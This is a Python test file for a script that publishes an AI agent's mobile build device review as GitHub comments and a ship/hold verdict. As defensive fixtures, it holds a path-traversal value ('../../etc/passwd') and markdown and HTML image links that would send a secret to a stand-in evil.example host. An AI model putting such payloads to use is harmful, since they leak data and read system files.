#!/usr/bin/env python3
"""Tests for scripts/device-review-publish.py: python3 scripts/test-device-review-publish.py"""

import importlib.util
import os
import unittest

spec = importlib.util.spec_from_file_location(
    "publish", os.path.join(os.path.dirname(os.path.abspath(__file__)), "device-review-publish.py")
)
publish = importlib.util.module_from_spec(spec)
spec.loader.exec_module(publish)

SCOPE = {
    "build": 1232,
    "prs": [
        {"pr": 1430, "kind": "app", "title": "support: drop local cc commands", "issues": [538, 540],
         "linked_by": {"538": "pr", "540": "mention"}},
        {"pr": 1443, "kind": "no-app", "title": "ci: something", "issues": []},
        {"pr": 1444, "kind": "strings", "title": "sync: update translate strings", "issues": []},
        {"pr": 1451, "kind": "app", "title": "fix(ui): grey strip", "issues": [551]},
        {"pr": None, "kind": "app", "title": "direct push", "issues": []},
    ],
}


class BuildItemsTest(unittest.TestCase):
    def test_every_reviewed_pr_gets_a_line_and_unreported_ones_are_unclear(self):
        review = {"items": [
            {"pr": 1430, "result": "pass", "summary": "chat opens", "flavor": "six"},
            {"pr": 9999, "result": "pass", "summary": "outside the scope"},
        ]}
        items = publish.build_items(SCOPE, review, set())
        self.assertEqual([i["pr"] for i in items], [1430, 1444, 1451])
        self.assertEqual([i["result"] for i in items], ["pass", "unclear", "unclear"])
        self.assertEqual(items[1]["summary"], "not reviewed")

    def test_issues_come_from_the_scope_not_the_agent(self):
        review = {"items": [{"pr": 1451, "result": "glitch", "summary": "strip", "issues": [1]}]}
        item = publish.build_items(SCOPE, review, set())[2]
        self.assertEqual(item["issues"], [551])

    def test_unknown_result_is_unclear_and_screenshots_must_exist(self):
        review = {"items": [{"pr": 1430, "result": "ship it", "summary": "x",
                             "screenshots": ["review-a.png", "../../etc/passwd", "review-b.jpg"]}]}
        review["items"][0]["flavor"] = "six"
        item = publish.build_items(SCOPE, review, {"review-a.jpg"})[0]
        self.assertEqual(item["result"], "unclear")
        self.assertEqual(item["screenshots"], ["review-a.jpg"])

    def test_text_is_capped_and_mentions_and_fences_neutralised(self):
        review = {"items": [{"pr": 1430, "result": "glitch", "summary": "@kar look\n" + "x" * 300,
                             "log_excerpt": "```\nend"}]}
        item = publish.build_items(SCOPE, review, set())[0]
        self.assertLessEqual(len(item["summary"]), 120)
        self.assertNotIn("@kar", item["summary"])
        self.assertNotIn("```", item["log_excerpt"])


    def test_agent_text_cannot_reach_the_network(self):
        review = {"items": [{"pr": 1430, "result": "glitch", "flavor": "six",
                             "summary": "see ![x](https://evil.example/a?d=secret) <img src=//evil.example/b>",
                             "seen": "[1]: http://evil.example/c www.evil.example/d data:text/html,x"}]}
        item = publish.build_items(SCOPE, review, set())[0]
        body = publish.comment("26.11.1232", 1232, "https://github.com/run", item, [])
        self.assertNotIn("evil.example", body)
        self.assertNotIn("![", item["summary"])
        self.assertNotIn("<", item["summary"])
        # Multi-line agent text sits inside a fence, where markdown is inert.
        self.assertIn("Seen:\n```\n", body)

    def test_fenced_text_keeps_angle_brackets_but_cannot_forge_the_marker(self):
        review = {"items": [{"pr": 1430, "result": "glitch", "flavor": "six", "summary": "x",
                             "log_excerpt": "List<String> hosts", "seen": publish.marker(1232, 1451)}]}
        item = publish.build_items(SCOPE, review, set())[0]
        self.assertEqual(item["log_excerpt"], "List<String> hosts")
        self.assertNotIn(publish.marker(1232, 1451), publish.comment("26.11.1232", 1232, "https://run", item, []))

    def test_comment_carries_the_build_and_pr_marker(self):
        item = publish.build_items(SCOPE, {"items": [{"pr": 1430, "result": "glitch", "summary": "x", "flavor": "six"}]}, set())[0]
        body = publish.comment("26.11.1232", 1232, "https://run", item, [])
        self.assertTrue(body.startswith(publish.marker(1232, 1430)))
        self.assertNotEqual(publish.marker(1232, 1430), publish.marker(1233, 1430))

    def test_comments_go_only_to_issues_the_pr_links_itself(self):
        item = publish.build_items(SCOPE, {"items": []}, set())[0]
        self.assertEqual(item["issues"], [538, 540])
        self.assertEqual(item["comment_issues"], [538])


FILE_SCOPE = {
    "build": 1244,
    "prs": [
        {"pr": 1432, "kind": "app", "ios": True, "android": True, "apps": ["six"], "title": "v6: arcs", "issues": []},
        {"pr": 1440, "kind": "app", "ios": True, "android": True, "apps": ["family", "six"], "title": "fix: errors", "issues": []},
        {"pr": 1451, "kind": "app", "ios": True, "android": True, "apps": [], "title": "fix(ui): strip", "issues": []},
        {"pr": 1453, "kind": "app", "ios": False, "android": True, "apps": [], "title": "fix(android): logo", "issues": [550]},
        {"pr": 1459, "kind": "deps", "ios": False, "android": True, "apps": [], "title": "bump ksp", "issues": []},
        {"pr": 1447, "kind": "no-app", "ios": False, "android": False, "apps": [], "title": "feat(release): x", "issues": []},
        {"pr": 1443, "kind": "listing", "ios": False, "android": False, "apps": [], "title": "chore(metadata): x", "issues": []},
    ],
}


class FileScopeTest(unittest.TestCase):
    def review(self, **flavors):
        return {"items": [{"pr": pr, "result": "pass", "summary": "ok", "flavor": f} for pr, f in
                          ((int(k[2:]), v) for k, v in flavors.items())]}

    def test_only_prs_with_ios_code_are_reviewed(self):
        items = publish.build_items(FILE_SCOPE, self.review(pr1432="six", pr1440="both", pr1451="six", pr1453="six"), set())
        self.assertEqual([i["pr"] for i in items], [1432, 1440, 1451])
        self.assertEqual([i["result"] for i in items], ["pass", "pass", "pass"])

    def test_android_and_tooling_prs_are_listed_na_and_stay_out_of_the_verdict(self):
        items = publish.build_items(FILE_SCOPE, self.review(pr1432="six", pr1440="both", pr1451="both"), set())
        skipped = publish.not_reviewed(FILE_SCOPE)
        self.assertEqual(skipped, [
            "n/a     #1453 Android only: emulator smoke and screenshots",
            "n/a     #1459 Android only: emulator smoke",
            "n/a     2 PRs without app code",
        ])
        text = publish.report("26.11.1244", 1244, "2026-11-12", "https://run", "success", items, True, skipped)
        self.assertIn(skipped[0], text.splitlines())
        self.assertEqual(text.splitlines()[-1], "Verdict: ship")

    def test_a_pass_must_cover_the_apps_the_paths_name(self):
        items = publish.build_items(FILE_SCOPE, self.review(pr1432="family", pr1440="six", pr1451="family"), set())
        self.assertEqual([i["result"] for i in items], ["unclear", "unclear", "pass"])
        self.assertIn("checked in six only, changes family and six", items[1]["summary"])
        # A wider check than the paths name is fine.
        self.assertEqual(publish.build_items(FILE_SCOPE, self.review(pr1432="both"), set())[0]["result"], "pass")

    def test_a_report_with_na_lines_is_replaced_whole(self):
        old = "Device review of build 1244, old\npass    #1 x\nn/a     #1453 Android only\nVerdict: ship\nAndroid screenshots: #1453 ok"
        self.assertEqual(publish.merge_description(old, "26.11.1244", "R"), "R\n\nAndroid screenshots: #1453 ok")


class VerdictTest(unittest.TestCase):
    def items(self, *results):
        return [{"result": r} for r in results]

    def test_ship_only_when_all_pass_and_smoke_green(self):
        self.assertEqual(publish.verdict(self.items("pass", "pass"), "success"), "ship")
        self.assertEqual(publish.verdict(self.items("pass", "unclear"), "success"), "hold")
        self.assertEqual(publish.verdict(self.items("pass"), "failure"), "hold")
        self.assertEqual(publish.verdict([], "success"), "ship")
        self.assertEqual(publish.verdict([], "success", reviewed=False), "hold")

    def test_report_shape(self):
        items = publish.build_items(SCOPE, {"items": [{"pr": 1430, "result": "pass", "summary": "chat", "flavor": "both"}]}, set())
        text = publish.report("26.11.1232", 1232, "2026-11-10", "https://run", "success", items)
        lines = text.splitlines()
        self.assertEqual(lines[0], "App release 26.11.1232 (build 1232)")
        self.assertIn("pass    #1430 chat (#538, #540)", lines)
        self.assertEqual(lines[-1], "Verdict: hold")

    def test_shot_path(self):
        self.assertEqual(publish.shot_path("26.11.1232", "42-2", 1451, "review-strip-1.jpg"), "26.11.1232/42-2/pr-1451-strip-1.jpg")

    def test_result_without_flavor_is_unclear(self):
        items = publish.build_items(SCOPE, {"items": [{"pr": 1430, "result": "pass", "summary": "chat"}]}, set())
        self.assertEqual(items[0]["result"], "unclear")

    def test_milestone_keeps_operator_notes(self):
        old = ("App release 26.11.1232 (build 1232)\nPicked 2026-11-10, device review pending\n"
               "Device review of build 1232, old\npass    #1 x\nVerdict: hold\n\nNote: hold for #1430 copy")
        merged = publish.merge_description(old, "26.11.1232", "App release 26.11.1232 (build 1232)\nVerdict: ship")
        self.assertEqual(merged, "App release 26.11.1232 (build 1232)\nVerdict: ship\n\nNote: hold for #1430 copy")
        self.assertEqual(publish.merge_description("", "26.11.1232", "R"), "R")

    def test_milestone_drops_a_whole_review_across_blank_lines(self):
        old = "Device review of build 1232, old\npass    #1 x\n\nunclear #2 y\nVerdict: hold\nNote: keep me"
        self.assertEqual(publish.merge_description(old, "26.11.1232", "R"), "R\n\nNote: keep me")

    def test_milestone_keeps_notes_after_a_review_without_verdict(self):
        old = "Device review of build 1232, cut short\npass    #1 x\nNote: keep me"
        merged = publish.merge_description(old, "26.11.1232", "R")
        self.assertEqual(merged, "R\n\npass    #1 x\nNote: keep me")


if __name__ == "__main__":
    unittest.main()
